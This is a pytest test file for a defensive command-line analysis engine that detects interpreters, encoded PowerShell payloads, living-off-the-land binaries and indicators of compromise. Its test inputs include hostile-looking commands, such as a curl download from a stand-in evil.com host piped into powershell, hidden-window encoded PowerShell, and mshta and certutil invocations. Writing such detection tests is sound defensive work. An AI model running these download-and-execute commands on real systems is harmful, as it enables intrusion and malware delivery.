"""Tests for the Intelligent Command-Line Analysis Engine (ICAE)."""
import os
import sys
import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import operations, ops_extended  # noqa: F401
from command_analyzer import (
    analyze_command, detect_interpreter, split_pipeline, tokenize,
    extract_iocs, map_mitre,
)


# --------------------------- interpreter detection --------------------------- #

@pytest.mark.parametrize("text, expected", [
    ("powershell.exe -c ls", "powershell"),
    ("PWSH -c ls", "powershell"),
    ("cmd /c dir", "cmd"),
    ("bash -c 'ls'", "bash"),
    ("python -c 'print(1)'", "python"),
    ("node -e 'console.log(1)'", "javascript"),
    ("mshta http://example.com/x.hta", "mshta"),
    ("rundll32.exe user32.dll", "rundll32"),
    ("regsvr32 /s scrobj.dll", "regsvr32"),
    ("certutil -decode a.b64 b.exe", "certutil"),
    ("cscript malicious.vbs", "wscript"),
    ("msiexec /i http://x/pkg.msi", "msiexec"),
    ("curl -o x.exe http://y.com/z", "curl"),
    ("wget http://y.com/z", "curl"),
    ("some-unknown-tool arg", None),
])
def test_detect_interpreter(text, expected):
    prof = detect_interpreter(text)
    assert (prof.name if prof else None) == expected


# --------------------------- pipeline splitting --------------------------- #

def test_split_pipeline_pipe_and_redirect():
    p = split_pipeline("curl http://x.com/a | powershell -c iex ; echo done > log")
    # 4 segments — the `> log` redirect is a separate connector
    assert len(p) == 4
    assert p[0]["cmd"].startswith("curl")
    assert p[1]["cmd"].startswith("powershell")
    assert p[2]["cmd"] == "echo done"
    assert p[3]["cmd"] == "log"
    assert p[1]["op"] == "|"
    assert p[2]["op"] == ";"
    assert p[3]["op"] == ">"


def test_split_pipeline_respects_quotes():
    p = split_pipeline('powershell -c "iex ; whoami" | tee log')
    # semicolon inside quotes must NOT split
    assert p[0]["cmd"] == 'powershell -c "iex ; whoami"'
    assert p[1]["cmd"] == "tee log"


# --------------------------- semantic payload identification --------------------------- #

def test_ps_enc_flag_is_top_confidence():
    r = analyze_command("powershell.exe -NoP -W Hidden -Enc SGVsbG9Xb3JsZDEyMzQ1Njc4OTAxYWJjZGVmZ2hp")
    # There should be a single payload with confidence 0.98 tied to -enc
    assert r["parsed_structure"]["interpreter"] == "powershell"
    payloads = r["identified_payloads"]
    assert any(p["role"].startswith("powershell") and p["confidence"] >= 0.95 for p in payloads)


def test_certutil_decode_never_decodes_filename():
    r = analyze_command("certutil -decode input.b64 output.exe")
    # Even though "input.b64" looks base64-ish it must NOT be flagged as a payload
    assert r["identified_payloads"] == []
    tags = [b["tag"] for b in r["behaviors"]]
    assert "file-decode" in tags


def test_download_and_execute_pipeline():
    r = analyze_command("curl http://evil.com/payload.ps1 | powershell")
    tags = [b["tag"] for b in r["behaviors"]]
    assert "network-fetch" in tags
    assert "download-and-execute" in tags
    assert "http://evil.com/payload.ps1" in r["iocs"]["urls"]
    # No inline base64 payload should be identified — the URL is the IOC
    assert not any(p["encoding"] == "base64" for p in r["identified_payloads"])


def test_ps_frombase64string_returns_needs_choice():
    r = analyze_command(
        'powershell -c "[Convert]::FromBase64String(\'aGVsbG8gd29ybGQ=\')"'
    )
    assert r["needs_choice"] is True
    # Both -c value and FromBase64String argument should be listed
    roles = [p["role"] for p in r["identified_payloads"]]
    assert any("powershell-c" in x for x in roles)
    assert any("FromBase64String" in x for x in roles)


def test_force_decode_span_bypasses_needs_choice():
    cmd = 'powershell -c "[Convert]::FromBase64String(\'aGVsbG8gd29ybGQ=\')"'
    # First call: needs_choice
    r1 = analyze_command(cmd)
    assert r1["needs_choice"] is True
    # Second call with the inner blob: should decode it
    r2 = analyze_command(cmd, force_decode_span="aGVsbG8gd29ybGQ=")
    assert r2["needs_choice"] is False
    assert any(d["final_output"] == "hello world" for d in r2["decode_chains"])


# --------------------------- LOLBins & MITRE --------------------------- #

def test_lolbin_detection():
    r = analyze_command("rundll32.exe user32.dll,LockWorkStation")
    names = [l["name"] for l in r["lolbins"]]
    assert "rundll32" in names


def test_mitre_dedup():
    r = analyze_command(
        "powershell.exe -Enc SGVsbG9Xb3JsZDEyMzQ1Njc4OTAxYWJjZGVmZ2hp"
    )
    ids = [m["id"] for m in r["mitre"]]
    assert len(ids) == len(set(ids))  # no duplicates


# --------------------------- IOC extraction --------------------------- #

def test_extract_iocs_bundle():
    t = ("visit http://c2.evil.example.com/beacon.php from 192.168.1.100. "
         "SHA256: " + "a" * 64 + " · HKLM\\Software\\Test · C:\\Windows\\Temp\\evil.exe")
    r = extract_iocs(t)
    assert "http://c2.evil.example.com/beacon.php" in r["urls"]
    assert "192.168.1.100" in r["ips"]
    assert any("HKLM" in k for k in r["regkeys"])
    assert any("evil.exe" in p for p in r["file_paths"])
    assert "a" * 64 in r["hashes"]["sha256"]


# --------------------------- inline reconstruction --------------------------- #

def test_inline_reconstruction_annotates_decoded_span():
    r = analyze_command(
        "powershell.exe -Enc SQBFAFgAIAAvAA==",  # UTF-16 LE of "IEX /"
    )
    if r["decode_chains"]:
        assert "«decoded:" in r["final_decoded_inline"]


# --------------------------- confidence gate: no false positives --------------------------- #

def test_no_decode_when_nothing_looks_encoded():
    r = analyze_command("ls -la /home/user/Documents")
    # No inline base64 / hex / etc.
    assert r["identified_payloads"] == []
    assert r["decode_chains"] == []


def test_short_base64_below_threshold_not_flagged():
    r = analyze_command("echo YWFh")  # only 4 chars — under min length
    assert r["identified_payloads"] == []
